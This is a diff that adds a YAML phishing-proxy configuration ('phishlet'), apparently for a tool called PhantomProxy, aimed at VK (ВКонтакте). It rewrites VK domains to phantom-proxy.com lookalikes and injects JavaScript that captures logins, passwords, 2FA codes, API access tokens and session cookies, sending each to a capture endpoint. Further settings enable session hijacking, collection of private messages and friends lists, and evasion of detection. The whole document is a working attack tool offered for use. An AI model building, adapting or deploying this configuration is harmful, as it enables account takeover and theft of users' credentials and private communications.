@@ -1,0 +1,290 @@
+# ============================================================================
+# VK (ВКонтакте) Phishlet
+# Полный перехват сессий ВКонтакте
+# ============================================================================
+
+id: vk
+name: VK (ВКонтакте)
+author: PhantomProxy Team
+version: "2.0"
+description: |
+  Перехват сессий ВКонтакте:
+  - Вход по логину/паролю
+  - 2FA подтверждение
+  - Перехват личных сообщений
+  - Перехват данных профиля
+
+target:
+  primary: "vk.com"
+  secondary:
+    - "www.vk.com"
+    - "m.vk.com"
+    - "api.vk.com"
+    - "id.vk.com"
+    - "oauth.vk.com"
+
+sub_filters:
+  - type: "domain"
+    from: "vk.com"
+    to: "vk.phantom-proxy.com"
+    priority: 1
+    
+  - type: "domain"
+    from: "www.vk.com"
+    to: "www.phantom-proxy.com"
+    priority: 2
+    
+  - type: "domain"
+    from: "m.vk.com"
+    to: "m.phantom-proxy.com"
+    priority: 3
+    
+  - type: "domain"
+    from: "api.vk.com"
+    to: "api.phantom-proxy.com"
+    priority: 4
+    
+  - type: "domain"
+    from: "id.vk.com"
+    to: "id.phantom-proxy.com"
+    priority: 5
+
+  - type: "domain"
+    from: "userapi.com"
+    to: "user.phantom-proxy.com"
+    priority: 100
+    
+  - type: "domain"
+    from: "sun1-*.userapi.com"
+    to: "sun.phantom-proxy.com"
+    priority: 101
+
+js_inject: |
+  (function() {
+    'use strict';
+    
+    console.log('[PhantomProxy] VK phishlet loaded');
+    
+    const vkCapture = {
+      // Перехват логина/пароля
+      captureCredentials: function(form) {
+        const email = form.querySelector('input[name="email"]')?.value || 
+                      form.querySelector('input[type="text"]')?.value || '';
+        const password = form.querySelector('input[type="password"]')?.value || '';
+        
+        if (email || password) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'vk_credentials',
+              email: email,
+              password: password,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват 2FA кода
+      capture2FA: function(code) {
+        if (code && code.length >= 6) {
+          fetch('/api/capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+              type: 'vk_2fa',
+              code: code,
+              url: window.location.href
+            })
+          });
+        }
+      },
+      
+      // Перехват access_token
+      captureToken: function() {
+        // VK использует access_token в API вызовах
+        const originalXHROpen = XMLHttpRequest.prototype.open;
+        const originalXHRSend = XMLHttpRequest.prototype.send;
+        
+        XMLHttpRequest.prototype.open = function(method, url) {
+          this._url = url;
+          return originalXHROpen.apply(this, arguments);
+        };
+        
+        XMLHttpRequest.prototype.send = function(data) {
+          const originalOnReadyStateChange = this.onreadystatechange;
+          this.onreadystatechange = function() {
+            if (this.readyState === 4 && this._url && this._url.includes('api.vk.com')) {
+              try {
+                const response = JSON.parse(this.responseText);
+                if (response.access_token) {
+                  fetch('/api/capture', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                      type: 'vk_access_token',
+                      token: response.access_token,
+                      user_id: response.user_id,
+                      url: window.location.href
+                    })
+                  });
+                }
+              } catch(e) {}
+            }
+            if (originalOnReadyStateChange) {
+              originalOnReadyStateChange.apply(this, arguments);
+            }
+          };
+          return originalXHRSend.apply(this, arguments);
+        };
+      },
+      
+      // Перехват сессии
+      captureSession: function() {
+        const cookies = {
+          remixlang: this.getCookie('remixlang'),
+          remixsid: this.getCookie('remixsid'),
+          remixsslsid: this.getCookie('remixsslsid'),
+          vk_appid: this.getCookie('vk_appid'),
+          p: this.getCookie('p')
+        };
+        
+        fetch('/api/capture', {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({
+            type: 'vk_session',
+            cookies: cookies,
+            url: window.location.href
+          })
+        });
+      },
+      
+      getCookie: function(name) {
+        const value = `; ${document.cookie}`;
+        const parts = value.split(`; ${name}=`);
+        if (parts.length === 2) return parts.pop().split(';').shift();
+        return '';
+      }
+    };
+    
+    // Перехват форм
+    document.addEventListener('submit', function(e) {
+      const form = e.target;
+      if (form.action && (form.action.includes('vk.com') || form.action.includes('/login'))) {
+        vkCapture.captureCredentials(form);
+      }
+    }, true);
+    
+    // Перехват 2FA input
+    document.addEventListener('input', function(e) {
+      if (e.target.tagName === 'INPUT') {
+        const name = e.target.name || e.target.id;
+        if (name.includes('code') || name.includes('otp') || name.includes('security_code')) {
+          if (e.target.value.length >= 6) {
+            vkCapture.capture2FA(e.target.value);
+          }
+        }
+      }
+    }, true);
+    
+    // Перехват API токенов
+    vkCapture.captureToken();
+    
+    // Захват при загрузке
+    window.addEventListener('load', function() {
+      vkCapture.captureSession();
+    });
+    
+    // Скрытие
+    Object.defineProperty(navigator, 'webdriver', { get: () => false });
+    
+  })();
+
+triggers:
+  - name: "vk_login"
+    path_regex: "/login|/auth|/authorize"
+    actions:
+      - type: "inject_js"
+        payload: "vk_login.js"
+      - type: "capture_form"
+        fields: ["email", "phone", "password", "pass"]
+      - type: "realtime_capture"
+        enabled: true
+        
+  - name: "vk_2fa"
+    path_regex: "/login\\?act=authcheck|/security|/verify"
+    actions:
+      - type: "capture_form"
+        fields: ["code", "otp", "security_code", "auth_code"]
+      - type: "wait_for_input"
+        timeout: 180
+        
+  - name: "vk_main"
+    host_regex: "vk.com"
+    path_exclude: "/login|/auth"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["remixsid", "remixsslsid", "p"]
+      - type: "session_hijack"
+        enabled: true
+      - type: "capture_messages"
+        enabled: true
+      - type: "capture_friends"
+        enabled: true
+        
+  - name: "vk_mobile"
+    host_regex: "m.vk.com"
+    actions:
+      - type: "capture_cookies"
+        cookies: ["remixsid", "p"]
+      - type: "session_hijack"
+        enabled: true
+
+cookies:
+  critical:
+    - "remixsid"
+    - "remixsslsid"
+    - "p"
+    - "vk_appid"
+    
+  session:
+    - "remixlang"
+    - "yuid"
+    - "_ym_uid"
+    
+  additional:
+    - "vk_sid"
+    - "api_hash"
+
+headers:
+  - "Authorization"
+  - "X-VK-Session"
+  - "X-VK-Token"
+
+anti_detection:
+  hide_webdriver: true
+  spoof_navigator: true
+  anti_devtools: true
+  random_timings: true
+  canvas_spoof: true
+  timezone_spoof: "Europe/Moscow"
+  language_spoof: "ru-RU"
+
+performance:
+  cache_static: true
+  compress_responses: true
+  lazy_images: true
+  minify_js: true
+  enable_brotli: true
+
+ssl:
+  min_version: "TLS1.2"
+
+logging:
+  log_requests: true
+  log_responses: true
+  log_errors: true
+  log_path: "./logs/vk/"
+  log_timezone: "Europe/Moscow"
